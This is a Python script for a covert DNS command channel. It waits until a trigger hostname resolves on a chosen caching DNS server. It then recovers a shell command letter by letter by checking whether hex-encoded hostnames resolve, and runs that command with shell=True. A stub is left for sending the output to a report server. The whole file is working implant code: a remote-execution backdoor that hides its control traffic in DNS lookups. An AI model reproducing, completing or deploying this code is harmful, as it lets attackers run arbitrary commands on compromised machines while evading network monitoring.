# -*- coding: utf-8 -*-
import dns.resolver
import subprocess
import time


DOMAIN_SERVER = 'Cache DNS Server is here'
DOMAIN_SERVER_PORT = 53
DOMAIN = 'your domain is here'
TRIGGER_HOST = '0x300x310x300x310x300x31' + DOMAIN


def can_be_resolved(host):
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [DOMAIN_SERVER]
    resolver.nameserver_ports = {DOMAIN_SERVER: DOMAIN_SERVER_PORT}
    try:
        answers = resolver.query(qname=host, rdtype='A')
    except:
        return False

    if len(answers) >= 1:
        return True
    else:
        return False


def get_command():
    start_num = 0x61       # a
    loop_num = start_num   # a
    end_num = 0x7a         # z

    resoloved_hostname = ''
    ret_command = ''
    while True:
        hostname = resoloved_hostname + str(hex(loop_num)) + DOMAIN

        if can_be_resolved(hostname):
            resoloved_hostname += str(hex(loop_num))
            ret_command += chr(loop_num)
            loop_num = start_num
            continue

        if loop_num == end_num:
            break
        else:
            loop_num += 1

    print('resolved_name_host : ', resoloved_hostname + DOMAIN)
    return ret_command


def execute_command(command):
    print('command : ', command)
    result = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.read()


def report_to_server(result):
    print('result : ', result)
    # Communication to the report server add here.


def main():
    # interval_time >= TTL
    interval_time = 10
    while True:
        for i in range(interval_time):
            time.sleep(1)
            print('\r[{}{}]'.format('*'*(i+1), '-'*(interval_time-(i+1))), end='')

        if can_be_resolved(TRIGGER_HOST):
            print('\n')
            command = get_command()
            result = execute_command(command)
            report_to_server(result)
            print('\n')


if __name__ == '__main__':
    main()
